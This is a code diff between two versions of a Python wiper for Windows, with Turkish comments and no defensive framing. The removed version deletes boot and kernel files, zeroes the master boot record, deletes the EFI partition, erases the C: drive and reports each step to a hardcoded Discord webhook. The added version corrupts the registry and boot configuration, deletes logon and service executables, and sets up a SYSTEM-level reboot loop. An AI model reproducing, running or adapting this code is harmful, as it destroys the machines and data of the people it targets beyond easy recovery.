@@ -1,73 +1,42 @@
 import os
 import subprocess
-import shutil
-import requests
+import time
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+# 1. Kayıt defterini boz
+try:
+    subprocess.run('reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control /f', shell=True)
+except:
+    pass
 
-def send_notification(message):
-    try:
-        payload = {"content": f"**[SİSTEM SİL]** {message}"}
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except:
-        pass
+# 2. BCD'yi boz
+try:
+    subprocess.run('bcdedit /delete {default} /f', shell=True)
+except:
+    pass
 
-def delete_system_files():
-    files = [
-        "C:\\bootmgr",
-        "C:\\Boot\\BCD",
-        "C:\\Windows\\System32\\winload.exe",
-        "C:\\Windows\\System32\\winload.efi",
-        "C:\\Windows\\System32\\winlogon.exe",
-        "C:\\Windows\\System32\\hal.dll",
-        "C:\\Windows\\System32\\ntoskrnl.exe",
-        "C:\\Windows\\System32\\ntdll.dll"
-    ]
-    for f in files:
-        try:
-            if os.path.exists(f):
-                os.remove(f)
-                send_notification(f"✅ Silindi: {f}")
-        except Exception as e:
-            send_notification(f"❌ Silinemedi: {f} - {e}")
+# 3. winlogon.exe'yi sil/taşı
+try:
+    os.rename("C:\\Windows\\System32\\winlogon.exe", "C:\\Windows\\System32\\winlogon.exe.bak")
+except:
+    pass
 
-def wipe_mbr():
-    try:
-        with open("\\\\.\\PhysicalDrive0", "wb") as f:
-            f.write(b'\x00' * 512)
-        send_notification("✅ MBR silindi!")
-    except Exception as e:
-        send_notification(f"❌ MBR silinemedi: {e}")
+# 4. services.exe'yi sil
+try:
+    os.remove("C:\\Windows\\System32\\services.exe")
+except:
+    pass
 
-def delete_efi():
-    try:
-        subprocess.run('diskpart /c "select disk 0" /c "select partition 1" /c "delete partition override"', shell=True)
-        send_notification("✅ EFI partition silindi!")
-    except Exception as e:
-        send_notification(f"❌ EFI silinemedi: {e}")
+# 5. LogonUI.exe'yi sil
+try:
+    os.remove("C:\\Windows\\System32\\LogonUI.exe")
+except:
+    pass
 
-def delete_bcd():
-    try:
-        subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
-        send_notification("✅ BCD silindi!")
-    except Exception as e:
-        send_notification(f"❌ BCD silinemedi: {e}")
+# 6. Sonsuz yeniden başlatma döngüsü (Task Scheduler)
+try:
+    subprocess.run('schtasks /create /tn "ShutdownLoop" /tr "shutdown /r /t 0" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True)
+except:
+    pass
 
-def wipe_disk():
-    try:
-        os.system('del /f /s /q C:\\* >nul 2>&1')
-        send_notification("✅ Tüm dosyalar silindi!")
-    except Exception as e:
-        send_notification(f"❌ Disk silinemedi: {e}")
-
-if __name__ == "__main__":
-    send_notification("💀 SİSTEM SİLME BAŞLATILDI!")
-    
-    delete_system_files()
-    wipe_mbr()
-    delete_efi()
-    delete_bcd()
-    wipe_disk()
-    
-    send_notification("💀 SİSTEM TAMAMEN BOZULDU!")
-    os.system("shutdown /r /t 0")
+# 7. Bilgisayarı yeniden başlat
+os.system("shutdown /r /t 0")
